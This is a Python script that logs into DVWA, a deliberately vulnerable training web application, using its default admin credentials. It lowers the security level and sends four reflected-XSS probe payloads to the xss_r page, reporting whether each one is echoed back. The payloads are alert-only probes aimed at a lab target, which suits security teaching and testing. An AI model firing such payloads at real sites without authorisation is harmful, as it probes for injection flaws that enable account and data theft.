import requests
from bs4 import BeautifulSoup
import urllib.parse

def login_to_dvwa(base_url):
    session = requests.Session()
    login_url = base_url + 'login.php'
    
    # Get CSRF token
    response = session.get(login_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    user_token = soup.find('input', {'name': 'user_token'})['value']
    
    # Login
    login_data = {
        'username': 'admin',
        'password': 'password',
        'user_token': user_token,
        'Login': 'Login'
    }
    response = session.post(login_url, data=login_data)
    
    # Check if login was successful
    if "Welcome to Damn Vulnerable Web Application!" in response.text:
        print("Login successful")
    else:
        print("Login failed")
        exit(1)
    
    return session

def test_xss(session, url, payload):
    encoded_payload = urllib.parse.quote(payload)
    full_url = url + encoded_payload
    print(f"Testing URL: {full_url}")
    
    try:
        response = session.get(full_url)
        print(f"Response status code: {response.status_code}")
        
        # Print the first 500 characters of the response
        print("Response preview:")
        print(response.text[:500])
        
        if payload in response.text:
            print(f"Potential XSS found with payload: {payload}")
        else:
            print(f"No XSS found with payload: {payload}")
        print("-" * 50)
    except requests.RequestException as e:
        print(f"Error testing {full_url}: {e}")

def main():
    base_url = input("Enter the base DVWA URL (e.g., http://localhost/dvwa/): ")
    if not base_url.endswith('/'):
        base_url += '/'
    
    if not base_url.startswith(('http://', 'https://')):
        print("Invalid URL. Please include http:// or https://")
        return

    session = login_to_dvwa(base_url)

    # Ensure security is set to low
    session.get(base_url + 'security.php', params={'security': 'low'})
    print("Security level set to low")

    xss_url = base_url + 'vulnerabilities/xss_r/?name='

    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')"
    ]

    print("\nTesting for XSS vulnerabilities...")
    for payload in payloads:
        test_xss(session, xss_url, payload)

if __name__ == "__main__":
    main()
